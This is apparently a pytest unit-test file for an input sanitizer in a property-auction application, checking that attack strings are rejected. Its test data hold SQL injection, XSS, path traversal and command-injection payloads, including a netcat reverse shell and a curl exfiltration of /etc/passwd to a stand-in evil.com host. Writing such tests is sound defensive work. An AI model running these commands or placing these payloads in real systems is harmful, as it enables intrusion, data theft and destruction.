"""
Unit tests for input validation and sanitization system.

This module tests the comprehensive security validation system to ensure
it properly protects against injection attacks and malformed data.
"""

import pytest
from config.validation import (
    InputSanitizer, PropertyValidator, QueryValidator,
    ValidationResult, validate_property_data, get_validation_summary
)


class TestInputSanitizer:
    """Test suite for InputSanitizer functionality."""

    def test_sanitize_string_basic(self):
        """Test basic string sanitization."""
        result = InputSanitizer.sanitize_string("Normal text")
        assert result.is_valid
        assert result.sanitized_value == "Normal text"
        assert len(result.errors) == 0

    def test_sanitize_string_too_long(self):
        """Test string length validation."""
        long_string = "x" * 1001
        result = InputSanitizer.sanitize_string(long_string, max_length=1000)
        assert result.is_valid
        assert len(result.sanitized_value) == 1000
        assert len(result.warnings) > 0

    def test_sanitize_string_sql_injection(self):
        """Test SQL injection detection."""
        malicious_inputs = [
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM passwords",
            "admin'--",
            "'; EXEC sp_configure --"
        ]

        for malicious_input in malicious_inputs:
            result = InputSanitizer.sanitize_string(malicious_input)
            assert not result.is_valid
            assert any("injection" in error.lower() for error in result.errors)

    def test_sanitize_string_xss_attacks(self):
        """Test XSS attack detection."""
        xss_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='evil.com'></iframe>",
            "vbscript:alert('xss')"
        ]

        for xss_input in xss_inputs:
            result = InputSanitizer.sanitize_string(xss_input)
            assert not result.is_valid
            assert any("xss" in error.lower() for error in result.errors)

    def test_sanitize_string_command_injection(self):
        """Test command injection detection."""
        command_inputs = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "`wget evil.com/malware`",
            "&& format c:",
            "../../../etc/passwd"
        ]

        for command_input in command_inputs:
            result = InputSanitizer.sanitize_string(command_input)
            assert not result.is_valid
            assert any("command" in error.lower() for error in result.errors)

    def test_sanitize_string_html_escaping(self):
        """Test HTML escaping."""
        html_input = "<b>Bold text</b> & special chars"
        result = InputSanitizer.sanitize_string(html_input, allow_html=False)
        assert result.is_valid
        assert "&lt;b&gt;" in result.sanitized_value
        assert "&amp;" in result.sanitized_value

    def test_sanitize_numeric_valid(self):
        """Test valid numeric input sanitization."""
        test_cases = [
            (123, 123.0),
            ("456", 456.0),
            ("1,234.56", 1234.56),
            ("$2,500.00", 2500.0)
        ]

        for input_val, expected in test_cases:
            result = InputSanitizer.sanitize_numeric(input_val)
            assert result.is_valid
            assert result.sanitized_value == expected

    def test_sanitize_numeric_invalid(self):
        """Test invalid numeric input handling."""
        invalid_inputs = ["not_a_number", "123abc", "", None]

        for invalid_input in invalid_inputs:
            result = InputSanitizer.sanitize_numeric(invalid_input)
            assert not result.is_valid
            assert len(result.errors) > 0

    def test_sanitize_numeric_range_validation(self):
        """Test numeric range validation."""
        # Test minimum value
        result = InputSanitizer.sanitize_numeric(-5, min_value=0)
        assert not result.is_valid
        assert any("minimum" in error.lower() for error in result.errors)

        # Test maximum value
        result = InputSanitizer.sanitize_numeric(150, max_value=100)
        assert not result.is_valid
        assert any("maximum" in error.lower() for error in result.errors)

        # Test negative not allowed
        result = InputSanitizer.sanitize_numeric(-10, allow_negative=False)
        assert not result.is_valid
        assert any("negative" in error.lower() for error in result.errors)


class TestPropertyValidator:
    """Test suite for PropertyValidator functionality."""

    def test_validate_parcel_id_valid(self):
        """Test valid parcel ID validation."""
        valid_ids = ["12345", "ABC-123", "PARCEL 001", "R123-456-789"]

        for parcel_id in valid_ids:
            result = PropertyValidator.validate_parcel_id(parcel_id)
            assert result.is_valid

    def test_validate_parcel_id_invalid(self):
        """Test invalid parcel ID validation."""
        invalid_ids = ["", "12", "x" * 51, "'; DROP TABLE --"]

        for parcel_id in invalid_ids:
            result = PropertyValidator.validate_parcel_id(parcel_id)
            assert not result.is_valid

    def test_validate_amount_valid(self):
        """Test valid amount validation."""
        valid_amounts = [1000, 50000.50, "25,000", "$15,000.00"]

        for amount in valid_amounts:
            result = PropertyValidator.validate_amount(amount)
            assert result.is_valid
            assert result.sanitized_value > 0

    def test_validate_amount_invalid(self):
        """Test invalid amount validation."""
        invalid_amounts = [-1000, 0, "free", "'; DROP TABLE --", 20_000_000]

        for amount in invalid_amounts:
            result = PropertyValidator.validate_amount(amount)
            assert not result.is_valid

    def test_validate_acreage_valid(self):
        """Test valid acreage validation."""
        valid_acreages = [1.5, 25.75, "3.25", 100]

        for acreage in valid_acreages:
            result = PropertyValidator.validate_acreage(acreage)
            assert result.is_valid
            assert result.sanitized_value >= 0

    def test_validate_acreage_invalid(self):
        """Test invalid acreage validation."""
        invalid_acreages = [-1, "not_a_number", 15000, "'; UNION SELECT --"]

        for acreage in invalid_acreages:
            result = PropertyValidator.validate_acreage(acreage)
            assert not result.is_valid

    def test_validate_county_valid(self):
        """Test valid Alabama county validation."""
        valid_counties = ["Baldwin", "Jefferson", "Mobile", "Madison", "Montgomery"]

        for county in valid_counties:
            result = PropertyValidator.validate_county(county)
            assert result.is_valid

    def test_validate_county_invalid(self):
        """Test invalid county validation."""
        invalid_counties = ["California", "NotACounty", "", "'; DROP TABLE --"]

        for county in invalid_counties:
            result = PropertyValidator.validate_county(county)
            assert not result.is_valid

    def test_validate_description_security(self):
        """Test description validation against malicious input."""
        malicious_descriptions = [
            "<script>alert('xss')</script>Property description",
            "Nice property'; DROP TABLE properties; --",
            "Property with $(rm -rf /)",
            "x" * 2001  # Too long
        ]

        for description in malicious_descriptions:
            result = PropertyValidator.validate_description(description)
            # Should either be invalid or properly sanitized
            if result.is_valid:
                # Check that malicious content was sanitized
                assert "<script>" not in result.sanitized_value
                assert "DROP TABLE" not in result.sanitized_value.upper()
                assert "rm -rf" not in result.sanitized_value

    def test_validate_owner_name_valid(self):
        """Test valid owner name validation."""
        valid_names = [
            "John Smith",
            "Mary Jane Doe",
            "Smith, John & Associates",
            "O'Connor Property LLC"
        ]

        for name in valid_names:
            result = PropertyValidator.validate_owner_name(name)
            assert result.is_valid

    def test_validate_year_sold_valid(self):
        """Test valid year validation."""
        current_year = 2025  # Test year
        valid_years = [2020, 2023, "2024", current_year]

        for year in valid_years:
            result = PropertyValidator.validate_year_sold(year)
            assert result.is_valid

    def test_validate_year_sold_invalid(self):
        """Test invalid year validation."""
        invalid_years = [1800, 2030, "not_a_year", "'; DROP TABLE --"]

        for year in invalid_years:
            result = PropertyValidator.validate_year_sold(year)
            assert not result.is_valid


class TestQueryValidator:
    """Test suite for QueryValidator functionality."""

    def test_validate_search_query_valid(self):
        """Test valid search query validation."""
        valid_queries = ["creek property", "water front", "2 acres Baldwin"]

        for query in valid_queries:
            result = QueryValidator.validate_search_query(query)
            assert result.is_valid

    def test_validate_search_query_invalid(self):
        """Test invalid search query validation."""
        malicious_queries = [
            "'; DROP TABLE properties; --",
            "<script>alert('xss')</script>",
            "%" * 10 + " wildcard abuse"
        ]

        for query in malicious_queries:
            result = QueryValidator.validate_search_query(query)
            # Should either be invalid or have warnings
            assert not result.is_valid or len(result.warnings) > 0

    def test_validate_sort_parameter_valid(self):
        """Test valid sort parameter validation."""
        valid_sorts = ["amount", "acreage", "investment_score", "county"]

        for sort_param in valid_sorts:
            result = QueryValidator.validate_sort_parameter(sort_param)
            assert result.is_valid

    def test_validate_sort_parameter_invalid(self):
        """Test invalid sort parameter validation."""
        invalid_sorts = ["invalid_field", "'; DROP TABLE --", "password"]

        for sort_param in invalid_sorts:
            result = QueryValidator.validate_sort_parameter(sort_param)
            assert not result.is_valid


class TestPropertyDataValidation:
    """Test suite for complete property data validation."""

    def test_validate_property_data_valid(self):
        """Test validation of valid property data."""
        valid_data = {
            "parcel_id": "R123-456",
            "amount": 15000,
            "acreage": 2.5,
            "county": "Baldwin",
            "description": "Beautiful property with creek frontage",
            "owner_name": "John Smith",
            "year_sold": "2023"
        }

        results = validate_property_data(valid_data)
        summary = get_validation_summary(results)

        assert summary["overall_valid"]
        assert summary["total_errors"] == 0
        assert summary["valid_fields"] == len(valid_data)

    def test_validate_property_data_invalid(self):
        """Test validation of invalid property data."""
        invalid_data = {
            "parcel_id": "'; DROP TABLE --",
            "amount": -1000,
            "acreage": "not_a_number",
            "county": "InvalidCounty",
            "description": "<script>alert('xss')</script>",
            "year_sold": "invalid_year"
        }

        results = validate_property_data(invalid_data)
        summary = get_validation_summary(results)

        assert not summary["overall_valid"]
        assert summary["total_errors"] > 0
        assert summary["invalid_fields"] > 0

    def test_validate_property_data_mixed(self):
        """Test validation of partially valid property data."""
        mixed_data = {
            "parcel_id": "R123-456",  # Valid
            "amount": 15000,          # Valid
            "county": "InvalidCounty", # Invalid
            "year_sold": "2023"       # Valid
        }

        results = validate_property_data(mixed_data)
        summary = get_validation_summary(results)

        assert not summary["overall_valid"]
        assert summary["valid_fields"] == 3
        assert summary["invalid_fields"] == 1


class TestSecurityFeatures:
    """Test suite for security-specific validation features."""

    def test_sql_injection_comprehensive(self):
        """Comprehensive SQL injection attack testing."""
        sql_payloads = [
            "'; SELECT * FROM users WHERE 1=1 --",
            "1' OR '1'='1",
            "admin'; DROP DATABASE auction_watcher; --",
            "'; EXEC xp_cmdshell('dir'); --",
            "1'; INSERT INTO users VALUES ('hacker','password'); --"
        ]

        for payload in sql_payloads:
            result = InputSanitizer.sanitize_string(payload)
            assert not result.is_valid
            assert any("injection" in error.lower() for error in result.errors)

    def test_xss_comprehensive(self):
        """Comprehensive XSS attack testing."""
        xss_payloads = [
            "<script>document.location='http://evil.com'</script>",
            "<img src='x' onerror='alert(document.cookie)'>",
            "javascript:void(alert('XSS'))",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            "<svg onload='alert(1)'>"
        ]

        for payload in xss_payloads:
            result = InputSanitizer.sanitize_string(payload)
            assert not result.is_valid
            assert any("xss" in error.lower() for error in result.errors)

    def test_command_injection_comprehensive(self):
        """Comprehensive command injection testing."""
        command_payloads = [
            "; wget http://evil.com/malware.sh",
            "| nc evil.com 4444 -e /bin/bash",
            "`curl evil.com/steal.php?data=$(cat /etc/passwd)`",
            "&& powershell.exe -Command 'Download malware'",
            "$(rm -rf / --no-preserve-root)"
        ]

        for payload in command_payloads:
            result = InputSanitizer.sanitize_string(payload)
            assert not result.is_valid
            assert any("command" in error.lower() for error in result.errors)

    def test_path_traversal_detection(self):
        """Test path traversal attack detection."""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]

        for payload in path_payloads:
            result = InputSanitizer.sanitize_string(payload)
            assert not result.is_valid
            assert any("command" in error.lower() for error in result.errors)

    def test_control_character_removal(self):
        """Test removal of control characters."""
        malicious_input = "Normal text\x00\x01\x02\x03\x1f\x7f"
        result = InputSanitizer.sanitize_string(malicious_input)

        # Control characters should be removed
        assert result.is_valid
        assert result.sanitized_value == "Normal text"
        assert "\x00" not in result.sanitized_value

    def test_massive_input_handling(self):
        """Test handling of extremely large inputs."""
        massive_input = "A" * 100000
        result = InputSanitizer.sanitize_string(massive_input, max_length=1000)

        assert result.is_valid
        assert len(result.sanitized_value) == 1000
        assert len(result.warnings) > 0


if __name__ == "__main__":
    pytest.main([__file__])